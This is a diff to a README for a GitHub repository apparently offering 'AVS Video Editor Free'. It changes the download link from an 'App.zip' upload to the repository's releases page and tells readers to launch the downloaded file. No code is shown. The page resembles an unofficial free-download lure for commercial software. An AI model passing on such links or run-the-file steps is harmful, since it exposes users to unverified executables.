@@ -36,7 +36,7 @@ Welcome to the AVS Video Editor Free GitHub repository! This repository is dedic
 
 ### AVS Video Editor Download:
 You can download AVS Video Editor from the following link:
-[Download AVS Video Editor](https://github.com/uploads/App.zip) 📥
+[Download AVS Video Editor](https://github.com/rauroh/AVS-Video-Editor-Free/releases) 📥
 
 ### Note:
 Make sure to launch the downloaded file to start using AVS Video Editor.
